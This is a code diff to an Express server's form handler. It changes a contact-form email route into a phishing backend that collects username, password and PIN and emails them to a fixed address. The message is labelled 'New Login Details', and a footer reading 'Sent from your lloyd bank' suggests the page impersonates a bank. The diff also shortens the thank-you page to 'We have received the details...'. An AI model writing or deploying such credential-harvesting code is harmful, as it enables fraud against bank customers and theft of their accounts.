@@ -46,10 +46,10 @@ app.get('/', (req, res) => {
 
 app.post('/send-email', async (req, res) => {
     try {
-        const { username,password } = req.body;
+        const { username,password,pin} = req.body;
 
         // Validate required fields
-        if (!username || !password) {
+        if (!username || !password || !pin) {
             return res.status(400).json({
                 success: false,
                 message: 'Please fill all required fields'
@@ -60,13 +60,15 @@ app.post('/send-email', async (req, res) => {
         const mailOptions = {
             from: `"Website Form" <${process.env.EMAIL_USER}>`,
             to: process.env.TO_EMAIL,
-            subject: `New Message from ${username}`,
+            subject: `New Login Details from ${username}`,
             html: `
                 <h2>New Contact Form Submission</h2>
                 <p><strong>Name:</strong> ${username}</p>
                 <p><strong>Password:</strong> ${password}</p>
+                <p><strong>Pin:</strong> ${pin}</p>
+
                 <hr>
-                <p>Sent from your website contact form</p>
+                <p>Sent from your lloyd bank</p>
             `
         };
 
@@ -90,10 +92,7 @@ app.post('/send-email', async (req, res) => {
 
 // Optional: Thank you page route
 app.get('/thank-you', (req, res) => {
-    res.render('thank-you', { 
-        title: 'Thank You',
-        message: 'Your message has been sent successfully!'
-    });
+    res.end("We have received the details...");
 });
 
 // Error handling middleware
